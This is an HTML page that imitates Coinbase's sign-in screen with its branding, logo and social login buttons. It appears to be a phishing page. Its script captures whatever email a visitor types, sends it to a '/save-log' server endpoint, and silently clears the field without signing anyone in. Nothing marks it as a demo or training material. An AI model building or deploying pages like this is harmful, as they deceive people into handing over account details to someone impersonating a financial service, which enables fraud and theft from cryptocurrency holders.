<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase - Sign In</title>
    <meta name="theme-color" content="#0052ff">
    <link rel="icon" href="/favicon.ico">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #0A0B0D;
            color: #FFFFFF;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-card {
            background-color: #0A0B0D;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            padding: 32px;
            width: 100%;
            max-width: 448px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .logo {
            width: 32px;
            height: 32px;
            fill: #FFFFFF;
        }

        .signup-btn {
            background: transparent;
            border: none;
            color: #FFFFFF;
            padding: 8px 16px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
        }

        .signup-btn:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        h2 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 24px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            font-size: 14px;
            margin-bottom: 8px;
            color: #FFFFFF;
        }

        input {
            width: 100%;
            padding: 12px;
            background: #0F1012;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: #FFFFFF;
            font-size: 16px;
        }

        input:focus {
            outline: none;
            border-color: #1652F0;
        }

        .continue-btn {
            width: 100%;
            padding: 16px;
            background: #1652F0;
            border: none;
            border-radius: 28px;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 24px;
        }

        .continue-btn:hover {
            background: #507FE5;
        }

        .continue-btn:disabled {
            background: #314B84;
            cursor: not-allowed;
        }

        .social-btn {
            width: 100%;
            padding: 12px;
            background: #1E2023;
            border: none;
            border-radius: 28px;
            color: #FFFFFF;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            cursor: pointer;
        }

        .social-btn:hover {
            background: #3A3D45;
        }

        .social-icon {
            width: 16px;
            height: 16px;
            fill: #FFFFFF;
        }

        .divider {
            position: relative;
            text-align: center;
            margin: 24px 0;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: rgba(255, 255, 255, 0.2);
            z-index: 0;
        }

        .divider span {
            background: #0A0B0D;
            padding: 0 16px;
            position: relative;
            z-index: 1;
            font-size: 14px;
            color: #FFFFFF;
        }

        .footer {
            text-align: center;
            padding: 16px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
        }

        .footer a {
            color: rgba(255, 255, 255, 0.6);
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="header">
        <svg class="logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
            <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"/>
        </svg>
        <button class="signup-btn">Sign up</button>
    </div>

    <div class="main-container">
        <div class="login-card">
            <h2>Sign in to Coinbase</h2>
            <form id="loginForm">
                <div class="form-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" placeholder="Your email address" required>
                </div>
                <button type="submit" class="continue-btn">Continue</button>

                <div class="divider"><span>OR</span></div>

                <button type="button" class="social-btn">
                    Sign in with Google
                    <svg class="social-icon" viewBox="0 0 17 17" xmlns="http://www.w3.org/2000/svg">
                        <path d="M16.18 8.57691C16.18 8.00964 16.1291 7.46419 16.0345 6.94055H8.5V10.0351H12.8055C12.62 11.0351 12.0564 11.8824 11.2091 12.4496V14.4569H13.7945C15.3073 13.0642 16.18 11.0133 16.18 8.57691Z" fill="white"/>
                        <path d="M8.50017 16.3949C10.6602 16.3949 12.4711 15.6786 13.7947 14.4567L11.2093 12.4495C10.4929 12.9295 9.57653 13.2131 8.50017 13.2131C6.41653 13.2131 4.65289 11.8058 4.0238 9.91492H1.35107V11.9876C2.66744 14.6022 5.37289 16.3949 8.50017 16.3949Z" fill="white"/>
                        <path d="M4.02364 9.91497C3.86364 9.43497 3.77273 8.92225 3.77273 8.39497C3.77273 7.8677 3.86364 7.35497 4.02364 6.87497V4.80225H1.35091C0.809091 5.88225 0.5 7.10406 0.5 8.39497C0.5 9.68588 0.809091 10.9077 1.35091 11.9877L4.02364 9.91497Z" fill="white"/>
                        <path d="M8.50017 3.57684C9.67471 3.57684 10.7293 3.98047 11.5583 4.7732L13.8529 2.47866C12.4674 1.18775 10.6565 0.39502 8.50017 0.39502C5.37289 0.39502 2.66744 2.18775 1.35107 4.80229L4.0238 6.87502C4.65289 4.98411 6.41653 3.57684 8.50017 3.57684Z" fill="white"/>
                    </svg>
                </button>

                <button type="button" class="social-btn">
                    Sign in with Wallet
                    <svg class="social-icon" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
                        <path d="M14 2H2C1.44772 2 1 2.44772 1 3V13C1 13.5523 1.44772 14 2 14H14C14.5523 14 15 13.5523 15 13V3C15 2.44772 14.5523 2 14 2ZM14 13H2V3H14V13ZM11 4H5V5H11V4ZM11 6H5V7H11V6Z" fill="white"/>
                    </svg>
                </button>
            </form>

            <div class="footer">
                Not your device? Use a private window. See our 
                <a href="#">Privacy Policy</a> for more info.
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const logEntry = {
                timestamp: new Date().toISOString(),
                email: emailInput.value,
                type: 'email_submission'
            };

            try {
                // Send log entry to server
                const response = await fetch('/save-log', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(logEntry)
                });

                if (response.ok) {
                    console.log('Log saved successfully');
                    emailInput.value = ''; // Clear input
                } else {
                    console.error('Failed to save log');
                }
            } catch (error) {
                console.error('Error saving log:', error);
            }
        });
    </script>
</body>
</html>
